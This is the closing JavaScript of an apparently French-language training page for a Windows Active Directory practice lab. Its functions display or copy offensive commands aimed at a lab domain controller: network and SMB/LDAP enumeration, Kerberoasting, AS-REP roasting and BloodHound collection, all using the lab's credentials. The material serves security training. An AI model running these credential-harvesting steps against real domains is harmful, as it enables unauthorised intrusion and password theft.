        // Fonctions sp√©cifiques au Windows AD Lab
        function deployWindowsLab() {
            alert('üöÄ D√©ploiement du Lab Windows AD...\n\nüìã Actions en cours :\n‚Ä¢ Cr√©ation des conteneurs Windows\n‚Ä¢ Configuration du Domain Controller\n‚Ä¢ Setup des comptes vuln√©rables\n\n‚è±Ô∏è Temps estim√© : 15-20 minutes');
        }

        function validateWinStep1() {
            const checkboxes = document.querySelectorAll('#winlab .step-card:first-child .checkbox.checked');
            if (checkboxes.length >= 3) {
                alert('üéâ Lab Windows d√©ploy√© avec succ√®s !\n\nüñ•Ô∏è Environnement disponible :\n‚Ä¢ Domain Controller : localhost:3389\n‚Ä¢ Client Windows : localhost:3390\n‚Ä¢ Domaine : CYBERLAB.LOCAL\n\nüîú Prochaine √©tape : Reconnaissance r√©seau');
            } else {
                alert('‚ö†Ô∏è Compl√©tez le d√©ploiement avant de continuer');
            }
        }

        function openKaliTerminal() {
            alert('üñ•Ô∏è Acc√®s au conteneur Kali Linux\n\nCommande d\'acc√®s :\ndocker exec -it cyberlab_kali_attacker /bin/bash\n\nüõ†Ô∏è Outils pr√©-install√©s :\n‚Ä¢ nmap, enum4linux\n‚Ä¢ impacket-scripts\n‚Ä¢ bloodhound-python\n‚Ä¢ hashcat, john');
        }

        function copyEnumCommands() {
            const commands = `# √ânum√©ration Active Directory
nmap -sV -p 53,88,135,139,389,445,636,3268,3389 172.35.0.10
enum4linux -a 172.35.0.10
smbclient -L //172.35.0.10 -N
ldapsearch -x -h 172.35.0.10 -b "DC=CYBERLAB,DC=LOCAL"

# Kerberoasting
GetUserSPNs.py CYBERLAB.LOCAL/user1:password123 -dc-ip 172.35.0.10 -request

# ASREPRoasting  
GetNPUsers.py CYBERLAB.LOCAL/ -usersfile users.txt -no-pass -dc-ip 172.35.0.10`;
            
            navigator.clipboard.writeText(commands).then(() => {
                alert('üìã Commandes d\'√©num√©ration copi√©es !\n\nCollez-les dans votre terminal Kali pour commencer la reconnaissance.');
            });
        }

        function startBloodHound() {
            alert('ü©∏ D√©marrage de BloodHound\n\nüìã √âtapes :\n1. sudo neo4j console\n2. Naviguer vers http://localhost:7474\n3. Login neo4j/neo4j ‚Üí changer le mot de passe\n4. bloodhound (dans un nouveau terminal)\n5. Se connecter avec les nouveaux credentials\n\nüìÅ Importer les fichiers .json collect√©s');
        }

        function downloadBloodHoundData() {
            alert('üì• Collection des donn√©es BloodHound\n\nCommande √† ex√©cuter :\nbloodhound-python -d CYBERLAB.LOCAL -u user1 -p password123 -gc WIN-DC01.CYBERLAB.LOCAL -c all\n\nüìä Fichiers g√©n√©r√©s :\n‚Ä¢ computers.json\n‚Ä¢ users.json\n‚Ä¢ groups.json\n‚Ä¢ domains.json');
        }

        // Animation au chargement
        window.addEventListener('load', () => {
            console.log('üöÄ CyberLab Genesis Guide charg√© !');
            
            // Animation du compteur
            const numbers = document.querySelectorAll('.stat-number');
            numbers.forEach(num => {
                const value = parseInt(num.textContent);
                num.textContent = '0';
                
                let current = 0;
                const increment = value / 30;
                const timer = setInterval(() => {
                    current += increment;
                    if (current >= value) {
                        num.textContent = value + (value === 92 ? '%' : '');
                        clearInterval(timer);
                    } else {
                        num.textContent = Math.floor(current) + (value === 92 ? '%' : '');
                    }
                }, 50);
            });
        });

        // Scroll fluide vers les sections
        function scrollToSection(sectionId) {
            document.getElementById(sectionId).scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    </script>
</body>
</html>
